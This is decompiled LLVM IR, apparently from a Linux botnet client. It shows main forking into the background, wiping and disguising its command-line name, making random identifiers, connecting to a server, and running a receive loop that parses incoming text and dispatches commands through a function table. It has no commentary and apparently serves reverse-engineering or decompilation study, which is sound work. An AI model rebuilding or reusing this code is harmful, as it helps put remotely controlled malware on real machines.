  %v3_10003fc4 = icmp eq i32 %v2_10003fc0, 106
  br i1 %v3_10003fc4, label %dec_label_pc_10003fcc, label %dec_label_pc_10004030

dec_label_pc_10003fcc:                            ; preds = %dec_label_pc_10003fb8, %dec_label_pc_10003f80
  %v3_10003fd0 = load i32, i32* @global_var_1002efd8.22, align 4
  store i32 268451820, i32* @lr, align 4
  %v5_10003fe8 = call i32 @__GI_setsockopt(i32 %v3_10003fd0, i32 1, i32 13, i32 0, i32 0)
  %v3_10003ff0 = load i32, i32* @global_var_1002efd8.22, align 4
  store i32 268451852, i32* @lr, align 4
  %v5_10004008 = call i32 @__GI_setsockopt(i32 %v3_10003ff0, i32 1, i32 2, i32 0, i32 0)
  %v3_10004010 = load i32, i32* @global_var_1002efd8.22, align 4
  store i32 ptrtoint (i32* @global_var_1000402c.185 to i32), i32* @lr, align 4
  %v5_10004028 = call i32 @__GI_setsockopt(i32 %v3_10004010, i32 1, i32 9, i32 0, i32 0)
  ret i32 %v5_10004028

dec_label_pc_10004030:                            ; preds = %dec_label_pc_10003fb8
  %v0_10004030 = call i32 @__errno_location()
  %v1_10004038 = inttoptr i32 %v0_10004030 to i32*
  %v2_10004038 = load i32, i32* %v1_10004038, align 4
  %v3_1000403c = icmp eq i32 %v2_10004038, 115
  br i1 %v3_1000403c, label %dec_label_pc_10004058, label %dec_label_pc_10004044

dec_label_pc_10004044:                            ; preds = %dec_label_pc_10004030
  %v0_10004044 = call i32 @__errno_location()
  %v1_1000404c = inttoptr i32 %v0_10004044 to i32*
  %v2_1000404c = load i32, i32* %v1_1000404c, align 4
  %v3_10004050 = icmp eq i32 %v2_1000404c, 114
  br i1 %v3_10004050, label %dec_label_pc_10004058, label %dec_label_pc_10004080

dec_label_pc_10004058:                            ; preds = %dec_label_pc_10004044, %dec_label_pc_10004030
  store i32 ptrtoint ([3 x i8]* @global_var_10004060.186 to i32), i32* @lr, align 4
  %v1_1000405c = call i32 @sleep(i32 1)
  store i32 268451944, i32* @lr, align 4
  %v1_10004064 = call i32 @__GI_time(i32 0)
  %v2_10004074 = sub i32 %v1_10004064, %v1_10003f70
  %tmp10 = icmp ult i32 %v2_10004074, 10
  br i1 %tmp10, label %dec_label_pc_10003f80, label %dec_label_pc_10004080

dec_label_pc_10004080:                            ; preds = %dec_label_pc_10004058, %dec_label_pc_10004044, %dec_label_pc_10003f30
  store i32 0, i32* @global_var_1002efe0.118, align 4
  %v3_10004090 = load i32, i32* @global_var_1002efd8.22, align 4
  store i32 268451996, i32* @lr, align 4
  %v1_10004098 = call i32 @close(i32 %v3_10004090)
  br label %dec_label_pc_10003dd4.backedge

; uselistorder directives
  uselistorder i32 %v1_10003f70, { 1, 0 }
  uselistorder i32 %v3_10003f00, { 1, 0 }
  uselistorder i32 %v2_10003eb0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10003ef4, { 1, 0 }
  uselistorder i32 (i32)* @sleep, { 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @connect, { 1, 0 }
  uselistorder i32 268451944, { 1, 0 }
  uselistorder i32 (i32)* @htons, { 9, 8, 7, 6, 5, 4, 1, 0, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @bcopy, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @close, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_gethostbyname, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10003f80, { 1, 0 }
  uselistorder label %dec_label_pc_10003f30, { 1, 0 }
  uselistorder label %dec_label_pc_10003dd4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10003e30, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-6180 = alloca i32, align 4
  %stack_var_-5156 = alloca i32, align 4
  %stack_var_-4132 = alloca i32, align 4
  %stack_var_-6316 = alloca i32, align 4
  %stack_var_-6616 = alloca i32, align 4
  %stack_var_-6308 = alloca i32, align 4
  store i32 268452060, i32* @lr, align 4
  %v0_100040d8 = call i32 @fork()
  %v3_100040e0 = icmp eq i32 %v0_100040d8, 0
  br i1 %v3_100040e0, label %dec_label_pc_100040f0, label %dec_label_pc_100040e8

dec_label_pc_100040e8:                            ; preds = %entry
  %v0_100040ec = call i32 @__GI_exit()
  br label %dec_label_pc_100040f0

dec_label_pc_100040f0:                            ; preds = %entry, %dec_label_pc_100040e8
  %v1_100040f4 = bitcast i8** %argv to i32*
  %v2_100040f4 = load i32, i32* %v1_100040f4, align 4
  store i32 %v2_100040f4, i32* @r3, align 4
  %v0_10004104 = call i32 @__GI_strlen()
  store i32 ptrtoint ([6 x i8]* @global_var_10018900.187 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10004120.188 to i32), i32* @lr, align 4
  %v4_1000411c = call i32 @strncpy(i32 %v2_100040f4, i32 ptrtoint ([6 x i8]* @global_var_10018900.187 to i32), i32 %v0_10004104)
  %v2_1000418c49 = icmp sgt i32 %argc, 1
  br i1 %v2_1000418c49, label %dec_label_pc_1000412c, label %dec_label_pc_10004194

dec_label_pc_1000412c:                            ; preds = %dec_label_pc_100040f0, %dec_label_pc_1000412c
  %storemerge1152 = phi i32 [ %v1_1000417c, %dec_label_pc_1000412c ], [ 1, %dec_label_pc_100040f0 ]
  %v1_10004130 = mul i32 %storemerge1152, 4
  %v2_1000413c = add i32 %v1_10004130, %tmp
  %v1_10004140 = inttoptr i32 %v2_1000413c to i32*
  %v2_10004140 = load i32, i32* %v1_10004140, align 4
  store i32 %v2_10004140, i32* @r3, align 4
  %v0_10004160 = call i32 @__GI_strlen()
  store i32 268452216, i32* @lr, align 4
  %v3_10004174 = call i32 @__GI_memset(i32 %v2_10004140, i32 0, i32 %v0_10004160)
  %v1_1000417c = add nuw nsw i32 %storemerge1152, 1
  %v2_1000418c = icmp slt i32 %v1_1000417c, %argc
  br i1 %v2_1000418c, label %dec_label_pc_1000412c, label %dec_label_pc_10004194

dec_label_pc_10004194:                            ; preds = %dec_label_pc_1000412c, %dec_label_pc_100040f0
  store i32 268452252, i32* @lr, align 4
  %v1_10004198 = call i32 @__GI_time(i32 0)
  store i32 268452260, i32* @lr, align 4
  %v0_100041a0 = call i32 @__libc_getpid()
  %v2_100041a8 = xor i32 %v1_10004198, %v0_100041a0
  store i32 268452272, i32* @lr, align 4
  %v0_100041ac = call i32 @getppid()
  %v2_100041b4 = add i32 %v2_100041a8, %v0_100041ac
  store i32 268452288, i32* @lr, align 4
  %v1_100041bc = call i32 @srand(i32 %v2_100041b4)
  store i32 268452292, i32* @lr, align 4
  %v0_100041c0 = call i32 @makestring()
  store i32 %v0_100041c0, i32* @global_var_1002efd4.157, align 4
  store i32 268452308, i32* @lr, align 4
  %v0_100041d0 = call i32 @makestring()
  store i32 %v0_100041d0, i32* @global_var_1002efd0.31, align 4
  store i32 268452324, i32* @lr, align 4
  %v0_100041e0 = call i32 @makestring()
  store i32 %v0_100041e0, i32* @global_var_1002efdc.189, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_10018908.190 to i32), i32* @global_var_1002efe8.155, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10018914.191 to i32), i32* @global_var_1002efe4.171, align 4
  store i32 0, i32* @global_var_1002efe0.118, align 4
  %v2_10004268 = ptrtoint i32* %stack_var_-6308 to i32
  %v2_100042c0 = ptrtoint i32* %stack_var_-6616 to i32
  %v2_100042c4 = add i32 %v2_100042c0, 308
  %v2_1000431c = ptrtoint i32* %stack_var_-6316 to i32
  %v2_10004530 = ptrtoint i32* %stack_var_-4132 to i32
  %v2_1000461c = ptrtoint i32* %stack_var_-5156 to i32
  %v2_100046c4 = ptrtoint i32* %stack_var_-6180 to i32
  %v2_10004564 = add i32 %v2_100042c0, 2484
  br label %dec_label_pc_10004220

dec_label_pc_10004220:                            ; preds = %dec_label_pc_10004528, %dec_label_pc_100042ac, %dec_label_pc_1000479c, %dec_label_pc_10004194
  store i32 268452388, i32* @lr, align 4
  %v0_10004220 = call i32 @con()
  %v3_10004228 = load i32, i32* @global_var_1002efd8.22, align 4
  %v3_10004230 = load i32, i32* @global_var_1002efd4.157, align 4
  %v3_10004238 = load i32, i32* @global_var_1002efd0.31, align 4
  %v3_10004240 = load i32, i32* @global_var_1002efdc.189, align 4
  store i32 %v3_10004240, i32* @r8, align 4
  %v7_10004260 = call i32 @Send(i32 %v3_10004228, i32 ptrtoint ([41 x i8]* @global_var_1001891c.192 to i32), i32 %v3_10004230, i32 %v3_10004238)
  br label %dec_label_pc_10004268

dec_label_pc_10004268:                            ; preds = %dec_label_pc_100044e8, %dec_label_pc_1000455c, %dec_label_pc_100047bc, %dec_label_pc_100047e0, %dec_label_pc_10004220
  br label %dec_label_pc_1000427c

dec_label_pc_1000427c:                            ; preds = %dec_label_pc_10004268, %dec_label_pc_1000427c
  %storemerge1224 = phi i32 [ 0, %dec_label_pc_10004268 ], [ %v1_10004298, %dec_label_pc_1000427c ]
  %v1_10004284 = mul nuw nsw i32 %storemerge1224, 4
  %v2_10004288 = add i32 %v1_10004284, %v2_10004268
  %v2_10004290 = inttoptr i32 %v2_10004288 to i32*
  store i32 0, i32* %v2_10004290, align 4
  %v1_10004298 = add nuw nsw i32 %storemerge1224, 1
  %tmp74 = icmp ult i32 %v1_10004298, 32
  br i1 %tmp74, label %dec_label_pc_1000427c, label %dec_label_pc_100042ac

dec_label_pc_100042ac:                            ; preds = %dec_label_pc_1000427c
  %v3_100042b0 = load i32, i32* @global_var_1002efd8.22, align 4
  %v1_100042b4 = udiv i32 %v3_100042b0, 32
  store i32 %v1_100042b4, i32* @r10, align 4
  %v1_100042bc = mul nuw nsw i32 %v1_100042b4, 4
  %v1_100042c8 = add i32 %v1_100042bc, %v2_100042c4
  %v1_100042cc = inttoptr i32 %v1_100042c8 to i32*
  %v2_100042cc = load i32, i32* %v1_100042cc, align 4
  %v1_100042d8 = urem i32 %v3_100042b0, 32
  %v3_100042e0 = shl i32 1, %v1_100042d8
  %v2_100042e4 = or i32 %v2_100042cc, %v3_100042e0
  store i32 %v2_100042e4, i32* %v1_100042cc, align 4
  store i32 1200, i32* %stack_var_-6316, align 4
  %v3_10004310 = load i32, i32* @global_var_1002efd8.22, align 4
  %v1_10004314 = add i32 %v3_10004310, 1
  store i32 268452664, i32* @lr, align 4
  %v6_10004334 = call i32 @__libc_select(i32 %v1_10004314, i32 %v2_10004268, i32 0, i32 0, i32 %v2_1000431c, i32 %v2_10004268)
  %tmp75 = icmp slt i32 %v6_10004334, 1
  br i1 %tmp75, label %dec_label_pc_10004220, label %dec_label_pc_100044d4.preheader

dec_label_pc_100044d4.preheader:                  ; preds = %dec_label_pc_100042ac
  %v3_100044d829 = load i32, i32* @global_var_1002efc8.25, align 4
  %v2_100044e030 = icmp eq i32 %v3_100044d829, 0
  br i1 %v2_100044e030, label %dec_label_pc_100044e8, label %dec_label_pc_10004350

dec_label_pc_10004350:                            ; preds = %dec_label_pc_100044d4.preheader, %dec_label_pc_100044c8
  %storemerge1332 = phi i32 [ %.pre, %dec_label_pc_100044c8 ], [ 0, %dec_label_pc_100044d4.preheader ]
  %v1_10004354 = mul i32 %storemerge1332, 4
  %v3_10004360 = load i32, i32* @global_var_1002efec.26, align 4
  %v2_10004364 = add i32 %v3_10004360, %v1_10004354
  %v1_10004368 = inttoptr i32 %v2_10004364 to i32*
  %v2_10004368 = load i32, i32* %v1_10004368, align 4
  store i32 268452732, i32* @lr, align 4
  %v3_10004378 = call i32 @waitpid(i32 %v2_10004368, i32 0, i32 1)
  %tmp76 = icmp slt i32 %v3_10004378, 1
  %.pre = add i32 %storemerge1332, 1
  br i1 %tmp76, label %dec_label_pc_100044c8, label %dec_label_pc_100043e0.preheader

dec_label_pc_100043e0.preheader:                  ; preds = %dec_label_pc_10004350
  %v3_100043e480 = load i32, i32* @global_var_1002efc8.25, align 4
  %v2_100043ec81 = icmp ult i32 %.pre, %v3_100043e480
  %v1_1000439c82 = mul i32 %.pre, 4
  %v3_100043a883 = load i32, i32* @global_var_1002efec.26, align 4
  %v2_100043ac84 = add i32 %v3_100043a883, %v1_1000439c82
  br i1 %v2_100043ec81, label %dec_label_pc_10004398, label %dec_label_pc_100043f4

dec_label_pc_10004398:                            ; preds = %dec_label_pc_100043e0.preheader, %dec_label_pc_10004398
  %v2_100043ac88 = phi i32 [ %v2_100043ac, %dec_label_pc_10004398 ], [ %v2_100043ac84, %dec_label_pc_100043e0.preheader ]
  %v1_1000438c85 = phi i32 [ %v1_1000438c, %dec_label_pc_10004398 ], [ %.pre, %dec_label_pc_100043e0.preheader ]
  %v1_100043b0 = add i32 %v2_100043ac88, -4
  store i32 %v1_100043b0, i32* @r10, align 4
  %v1_100043cc = inttoptr i32 %v2_100043ac88 to i32*
  %v2_100043cc = load i32, i32* %v1_100043cc, align 4
  %v2_100043d0 = inttoptr i32 %v1_100043b0 to i32*
  store i32 %v2_100043cc, i32* %v2_100043d0, align 4
  %v1_1000438c = add i32 %v1_1000438c85, 1
  %v3_100043e4 = load i32, i32* @global_var_1002efc8.25, align 4
  %v2_100043ec = icmp ult i32 %v1_1000438c, %v3_100043e4
  %v1_1000439c = mul i32 %v1_1000438c, 4
  %v3_100043a8 = load i32, i32* @global_var_1002efec.26, align 4
  %v2_100043ac = add i32 %v3_100043a8, %v1_1000439c
  br i1 %v2_100043ec, label %dec_label_pc_10004398, label %dec_label_pc_100043f4

dec_label_pc_100043f4:                            ; preds = %dec_label_pc_10004398, %dec_label_pc_100043e0.preheader
  %v2_100043ac.lcssa = phi i32 [ %v2_100043ac84, %dec_label_pc_100043e0.preheader ], [ %v2_100043ac, %dec_label_pc_10004398 ]
  %v1_1000440c = add i32 %v2_100043ac.lcssa, -4
  %v2_10004414 = inttoptr i32 %v1_1000440c to i32*
  store i32 0, i32* %v2_10004414, align 4
  %v3_1000441c = load i32, i32* @global_var_1002efc8.25, align 4
  %v1_10004420 = add i32 %v3_1000441c, -1
  store i32 %v1_10004420, i32* @global_var_1002efc8.25, align 4
  %v1_10004434 = mul i32 %v1_10004420, 4
  %v1_10004438 = add i32 %v1_10004434, 4
  store i32 %v1_10004438, i32* @r3, align 4
  store i32 268452932, i32* @lr, align 4
  %v0_10004440 = call i32 @malloc()
  %v3_1000449c25 = load i32, i32* @global_var_1002efc8.25, align 4
  %v2_100044a426 = icmp eq i32 %v3_1000449c25, 0
  br i1 %v2_100044a426, label %dec_label_pc_100044ac, label %dec_label_pc_10004458

dec_label_pc_10004458:                            ; preds = %dec_label_pc_100043f4, %dec_label_pc_10004458
  %storemerge2028 = phi i32 [ %v1_10004490, %dec_label_pc_10004458 ], [ 0, %dec_label_pc_100043f4 ]
  %v1_1000445c = mul i32 %storemerge2028, 4
  %v2_10004468 = add i32 %v1_1000445c, %v0_10004440
  store i32 %v2_10004468, i32* @r10, align 4
  %v3_1000447c = load i32, i32* @global_var_1002efec.26, align 4
  %v2_10004480 = add i32 %v3_1000447c, %v1_1000445c
  %v1_10004484 = inttoptr i32 %v2_10004480 to i32*
  %v2_10004484 = load i32, i32* %v1_10004484, align 4
  %v2_10004488 = inttoptr i32 %v2_10004468 to i32*
  store i32 %v2_10004484, i32* %v2_10004488, align 4
  %v1_10004490 = add i32 %storemerge2028, 1
  %v3_1000449c = load i32, i32* @global_var_1002efc8.25, align 4
  %v2_100044a4 = icmp ult i32 %v1_10004490, %v3_1000449c
  br i1 %v2_100044a4, label %dec_label_pc_10004458, label %dec_label_pc_10004498.dec_label_pc_100044ac_crit_edge

dec_label_pc_10004498.dec_label_pc_100044ac_crit_edge: ; preds = %dec_label_pc_10004458
  br label %dec_label_pc_100044ac

dec_label_pc_100044ac:                            ; preds = %dec_label_pc_100043f4, %dec_label_pc_10004498.dec_label_pc_100044ac_crit_edge
  %v3_100044b0 = load i32, i32* @global_var_1002efec.26, align 4
  store i32 %v3_100044b0, i32* @r3, align 4
  store i32 268453052, i32* @lr, align 4
  %v0_100044b8 = call i32 @free()
  store i32 %v0_10004440, i32* @global_var_1002efec.26, align 4
  br label %dec_label_pc_100044c8

dec_label_pc_100044c8:                            ; preds = %dec_label_pc_10004350, %dec_label_pc_100044ac
  %v3_100044d8 = load i32, i32* @global_var_1002efc8.25, align 4
  %v2_100044e0 = icmp ult i32 %.pre, %v3_100044d8
  br i1 %v2_100044e0, label %dec_label_pc_10004350, label %dec_label_pc_100044e8

dec_label_pc_100044e8:                            ; preds = %dec_label_pc_100044d4.preheader, %dec_label_pc_100044c8
  %v3_100044ec = load i32, i32* @global_var_1002efd8.22, align 4
  %v1_100044f0 = udiv i32 %v3_100044ec, 32
  %v1_100044f4 = mul nuw nsw i32 %v1_100044f0, 4
  %v1_10004500 = add i32 %v1_100044f4, %v2_100042c4
  %v1_10004504 = inttoptr i32 %v1_10004500 to i32*
  %v2_10004504 = load i32, i32* %v1_10004504, align 4
  %v1_10004510 = urem i32 %v3_100044ec, 32
  %v3_10004514 = sub i32 0, %v3_100044ec
  %v4_10004514 = urem i32 %v3_10004514, 32
  %v5_10004514 = shl i32 %v2_10004504, %v4_10004514
  %v6_10004514 = xor i32 %v4_10004514, 31
  %v7_10004514 = lshr i32 %v2_10004504, %v6_10004514
  %v8_10004514 = udiv i32 %v7_10004514, 2
  %v9_10004514 = or i32 %v8_10004514, %v5_10004514
  %v12_10004514 = lshr i32 -1, %v1_10004510
  %tmp101 = icmp slt i32 %v2_10004504, 0
  %v15_1000451421 = zext i1 %tmp101 to i32
  %v16_10004514 = xor i32 %v12_10004514, 1
  %v17_10004514 = and i32 %v15_1000451421, %v16_10004514
  %v14_10004514 = urem i32 %v12_10004514, 2
  %v14_10004514.masked = and i32 %v14_10004514, %v9_10004514
  %v1_1000451c = or i32 %v14_10004514.masked, %v17_10004514
  %v3_10004520 = icmp eq i32 %v1_1000451c, 0
  br i1 %v3_10004520, label %dec_label_pc_10004268, label %dec_label_pc_10004528

dec_label_pc_10004528:                            ; preds = %dec_label_pc_100044e8
  store i32 268453192, i32* @lr, align 4
  %v4_10004544 = call i32 @recv(i32 %v3_100044ec, i32 %v2_10004530, i32 4096, i32 0)
  store i32 %v4_10004544, i32* %stack_var_-6616, align 4
  %tmp77 = icmp slt i32 %v4_10004544, 1
  br i1 %tmp77, label %dec_label_pc_10004220, label %dec_label_pc_1000455c

dec_label_pc_1000455c:                            ; preds = %dec_label_pc_10004528
  %v3_1000456c = add i32 %v2_10004564, %v4_10004544
  %v4_1000456c = inttoptr i32 %v3_1000456c to i8*
  store i8 0, i8* %v4_1000456c, align 1
  store i32 ptrtoint (i32* @global_var_10018948.194 to i32), i32* @r4, align 4
  store i32 268453252, i32* @lr, align 4
  %v3_10004580 = call i32 @__GI_strtok(i32 %v2_10004530, i32 ptrtoint (i32* @global_var_10018948.194 to i32), i32 268566528)
  %v3_100047d846 = icmp eq i32 %v3_10004580, 0
  br i1 %v3_100047d846, label %dec_label_pc_10004268, label %dec_label_pc_100047e0

dec_label_pc_10004590:                            ; preds = %dec_label_pc_100047e0
  store i32 268453272, i32* @lr, align 4
  %v2_10004594 = call i32 @filter(i32 %storemerge48.in)
  %v2_1000459c = load i8, i8* %storemerge48, align 1
  %v3_100045a4 = icmp eq i8 %v2_1000459c, 58
  br i1 %v3_100045a4, label %dec_label_pc_100045c4.preheader, label %dec_label_pc_10004650

dec_label_pc_100045c4.preheader:                  ; preds = %dec_label_pc_10004590
  store i32 0, i32* %stack_var_-6616, align 4
  store i32 %storemerge48.in, i32* @r3, align 4
  %v0_100045cc33 = call i32 @__GI_strlen()
  %v2_100045d435 = icmp eq i32 %v0_100045cc33, 0
  br i1 %v2_100045d435, label %dec_label_pc_100045fc, label %dec_label_pc_100045dc

dec_label_pc_100045b8:                            ; preds = %dec_label_pc_100045dc
  %v1_100045bc = add i32 %v3_100045dc, 1
  store i32 %v1_100045bc, i32* %stack_var_-6616, align 4
  store i32 %storemerge48.in, i32* @r3, align 4
  %v0_100045cc = call i32 @__GI_strlen()
  %v2_100045d4 = icmp ult i32 %v1_100045bc, %v0_100045cc
  br i1 %v2_100045d4, label %dec_label_pc_100045dc, label %dec_label_pc_100045fc

dec_label_pc_100045dc:                            ; preds = %dec_label_pc_100045c4.preheader, %dec_label_pc_100045b8
  %v3_100045dc = load i32, i32* %stack_var_-6616, align 4
  %v2_100045e8 = add i32 %v3_100045dc, %storemerge48.in
  %v1_100045ec = inttoptr i32 %v2_100045e8 to i8*
  %v2_100045ec = load i8, i8* %v1_100045ec, align 1
  %v3_100045f4 = icmp eq i8 %v2_100045ec, 32
  br i1 %v3_100045f4, label %dec_label_pc_100045fc, label %dec_label_pc_100045b8

dec_label_pc_100045fc:                            ; preds = %dec_label_pc_100045c4.preheader, %dec_label_pc_100045b8, %dec_label_pc_100045dc
  %v3_100045fc = load i32, i32* %stack_var_-6616, align 4
  %v2_10004608 = add i32 %v3_100045fc, %storemerge48.in
  %v3_10004610 = inttoptr i32 %v2_10004608 to i8*
  store i8 0, i8* %v3_10004610, align 1
  %v1_10004618 = add i32 %storemerge48.in, 1
  %v2_10004628 = inttoptr i32 %v1_10004618 to i8*
  %v3_10004628 = call i32 @strcpy(i32 %v2_1000461c, i8* %v2_10004628)
  %v3_1000462c = load i32, i32* %stack_var_-6616, align 4
  %v2_10004638 = add i32 %v3_1000462c, %storemerge48.in
  %v1_1000463c = add i32 %v2_10004638, 1
  %v3_10004648 = inttoptr i32 %v1_1000463c to i8*
  %v4_10004648 = call i32 @strcpy(i32 %storemerge48.in, i8* %v3_10004648)
  br label %dec_label_pc_10004674.preheader

dec_label_pc_10004650:                            ; preds = %dec_label_pc_10004590
  store i32 10752, i32* %stack_var_-5156, align 4
  br label %dec_label_pc_10004674.preheader

dec_label_pc_10004674.preheader:                  ; preds = %dec_label_pc_100045fc, %dec_label_pc_10004650
  store i32 0, i32* %stack_var_-6616, align 4
  store i32 %storemerge48.in, i32* @r3, align 4
  %v0_1000467c38 = call i32 @__GI_strlen()
  %v2_1000468440 = icmp eq i32 %v0_1000467c38, 0
  br i1 %v2_1000468440, label %dec_label_pc_100046ac, label %dec_label_pc_1000468c

dec_label_pc_10004668:                            ; preds = %dec_label_pc_1000468c
  %v1_1000466c = add i32 %v3_1000468c, 1
  store i32 %v1_1000466c, i32* %stack_var_-6616, align 4
  store i32 %storemerge48.in, i32* @r3, align 4
  %v0_1000467c = call i32 @__GI_strlen()
  %v2_10004684 = icmp ult i32 %v1_1000466c, %v0_1000467c
  br i1 %v2_10004684, label %dec_label_pc_1000468c, label %dec_label_pc_100046ac

dec_label_pc_1000468c:                            ; preds = %dec_label_pc_10004674.preheader, %dec_label_pc_10004668
  %v3_1000468c = load i32, i32* %stack_var_-6616, align 4
  %v2_10004698 = add i32 %v3_1000468c, %storemerge48.in
  %v1_1000469c = inttoptr i32 %v2_10004698 to i8*
  %v2_1000469c = load i8, i8* %v1_1000469c, align 1
  %v3_100046a4 = icmp eq i8 %v2_1000469c, 32
  br i1 %v3_100046a4, label %dec_label_pc_100046ac, label %dec_label_pc_10004668

dec_label_pc_100046ac:                            ; preds = %dec_label_pc_10004674.preheader, %dec_label_pc_10004668, %dec_label_pc_1000468c
  %v3_100046ac = load i32, i32* %stack_var_-6616, align 4
  %v2_100046b8 = add i32 %v3_100046ac, %storemerge48.in
  %v3_100046c0 = inttoptr i32 %v2_100046b8 to i8*
  store i8 0, i8* %v3_100046c0, align 1
  %v4_100046d0 = call i32 @strcpy(i32 %v2_100046c4, i8* %storemerge48)
  %v3_100046d4 = load i32, i32* %stack_var_-6616, align 4
  %v2_100046e0 = add i32 %v3_100046d4, %storemerge48.in
  %v1_100046e4 = add i32 %v2_100046e0, 1
  %v3_100046f0 = inttoptr i32 %v1_100046e4 to i8*
  %v4_100046f0 = call i32 @strcpy(i32 %storemerge48.in, i8* %v3_100046f0)
  store i32 0, i32* %stack_var_-6616, align 4
  %v2_1000479091 = load i32, i32* bitcast ([4 x i8]** @global_var_1002a70c.198 to i32*), align 4
  %v3_1000479494 = icmp eq i32 %v2_1000479091, 0
  br i1 %v3_1000479494, label %dec_label_pc_1000479c, label %dec_label_pc_10004700

dec_label_pc_10004700:                            ; preds = %dec_label_pc_100046ac, %dec_label_pc_10004700
  %v1_1000479097 = phi i32* [ %v1_10004790, %dec_label_pc_10004700 ], [ bitcast ([4 x i8]** @global_var_1002a70c.198 to i32*), %dec_label_pc_100046ac ]
  %v2_10004714 = load i32, i32* %v1_1000479097, align 4
  store i32 %v2_10004714, i32* @r3, align 4
  store i32 %v2_100046c4, i32* @r4, align 4
  %v2_10004724 = call i32 @__GI_strcasecmp(i32 %v2_10004714, i32 %v2_100046c4)
  %v3_10004734 = load i32, i32* %stack_var_-6616, align 4
  %v1_10004740 = mul i32 %v3_10004734, 8
  %v1_10004748 = add i32 %v1_10004740, add (i32 ptrtoint ([4 x i8]** @global_var_1002a70c.198 to i32), i32 4)
  %v1_1000474c = inttoptr i32 %v1_10004748 to i32*
  %v2_1000474c = load i32, i32* %v1_1000474c, align 4
  call void @__pseudo_call(i32 %v2_1000474c)
  %v3_10004770 = load i32, i32* %stack_var_-6616, align 4
  %v1_10004774 = add i32 %v3_10004770, 1
  store i32 %v1_10004774, i32* %stack_var_-6616, align 4
  %v1_10004788 = mul i32 %v1_10004774, 8
  %v2_1000478c = add i32 %v1_10004788, ptrtoint ([4 x i8]** @global_var_1002a70c.198 to i32)
  %v1_10004790 = inttoptr i32 %v2_1000478c to i32*
  %v2_10004790 = load i32, i32* %v1_10004790, align 4
  %v3_10004794 = icmp eq i32 %v2_10004790, 0
  br i1 %v3_10004794, label %dec_label_pc_1000479c, label %dec_label_pc_10004700

dec_label_pc_1000479c:                            ; preds = %dec_label_pc_10004700, %dec_label_pc_100046ac
  store i32 %v2_100046c4, i32* @r3, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1001894c.199 to i32), i32* @r4, align 4
  %v3_100047ac = call i32 @__GI_strcasecmp(i32 %v2_100046c4, i32 ptrtoint ([6 x i8]* @global_var_1001894c.199 to i32))
  %v3_100047b4 = icmp eq i32 %v3_100047ac, 0
  br i1 %v3_100047b4, label %dec_label_pc_10004220, label %dec_label_pc_100047bc

dec_label_pc_100047bc:                            ; preds = %dec_label_pc_1000479c
  store i32 ptrtoint (i32* @global_var_10018948.194 to i32), i32* @r4, align 4
  store i32 268453836, i32* @lr, align 4
  %v3_100047c8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018948.194 to i32), i32 268566528)
  %v3_100047d8 = icmp eq i32 %v3_100047c8, 0
  br i1 %v3_100047d8, label %dec_label_pc_10004268, label %dec_label_pc_100047e0

dec_label_pc_100047e0:                            ; preds = %dec_label_pc_1000455c, %dec_label_pc_100047bc
  %storemerge48.in = phi i32 [ %v3_100047c8, %dec_label_pc_100047bc ], [ %v3_10004580, %dec_label_pc_1000455c ]
  %storemerge48 = inttoptr i32 %storemerge48.in to i8*
  %v2_100047e4 = load i8, i8* %storemerge48, align 1
  %v3_100047ec = icmp eq i8 %v2_100047e4, 0
  br i1 %v3_100047ec, label %dec_label_pc_10004268, label %dec_label_pc_10004590

; uselistorder directives
  uselistorder i8* %storemerge48, { 2, 1, 0 }
  uselistorder i32 %storemerge48.in, { 14, 13, 7, 10, 5, 4, 9, 3, 8, 6, 12, 2, 1, 0, 11 }
  uselistorder i32* %v1_10004790, { 1, 0 }
  uselistorder i32 %v4_10004514, { 1, 0 }
  uselistorder i32 %v2_10004504, { 0, 2, 1 }
  uselistorder i32 %v3_100044ec, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10004490, { 1, 0 }
  uselistorder i32 %v1_1000445c, { 1, 0 }
  uselistorder i32 %storemerge2028, { 1, 0 }
  uselistorder i32 %v0_10004440, { 1, 0 }
  uselistorder i32 %v1_1000438c, { 0, 2, 1 }
  uselistorder i32 %v2_100043ac88, { 1, 0 }
  uselistorder i32 %.pre, { 2, 4, 0, 3, 1 }
  uselistorder i32 %storemerge1332, { 1, 0 }
  uselistorder i32 %v3_100042b0, { 1, 0 }
  uselistorder i32 %storemerge1224, { 1, 0 }
  uselistorder i32 %v2_100046c4, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_10004268, { 2, 1, 0 }
  uselistorder i32 %v1_1000417c, { 1, 0 }
  uselistorder i32 %v2_10004140, { 1, 0 }
  uselistorder i32 %storemerge1152, { 1, 0 }
  uselistorder i32* %stack_var_-6616, { 5, 6, 7, 0, 8, 9, 10, 4, 1, 11, 12, 13, 3, 2, 14, 15 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_1002a70c.198 to i32), { 1, 0 }
  uselistorder [4 x i8]** @global_var_1002a70c.198, { 1, 0 }
  uselistorder i32 (i32)* @filter, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10018948.194 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @recv, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_1002efec.26, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* @global_var_1002efc8.25, { 5, 6, 2, 7, 8, 9, 0, 1, 10, 3, 11, 4, 12, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_select, { 1, 0 }
